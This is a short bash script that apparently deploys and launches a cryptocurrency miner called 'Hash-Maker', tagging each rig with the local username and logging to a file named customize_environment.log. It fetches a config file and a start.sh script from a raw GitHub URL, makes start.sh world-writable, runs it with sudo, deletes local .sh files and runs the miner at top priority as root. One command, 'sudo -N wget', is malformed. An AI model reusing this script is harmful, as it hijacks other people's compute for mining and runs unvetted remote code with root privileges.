#!/bin/bash

export TZ=America/Sao_Paulo
export LOCAL=$(cat $(find /home -name home.file))

cd $LOCAL
data=$(date +"%d-%m-%Y_%H:%M:%S")
echo $data >> customize_environment.log
user=${LOCAL/'/home/'}

if [ -e "CORE/build/Hash-Maker" ]; then
   sudo ./init.sh
   sudo ./install.sh
   cd CORE/build 
   sudo wget -N https://raw.githubusercontent.com/robotpack/scripts/master/config.json
   sudo sed -i 's/"rig-id":.*/"rig-id": "'$user'",/' config.json
else
   sudo rm -rf *.sh
   sudo -N wget https://raw.githubusercontent.com/robotpack/scripts/master/start.sh
   chmod 777 start.sh
   sudo ./start.sh
fi

sudo nice -n -20 ./Hash-Maker
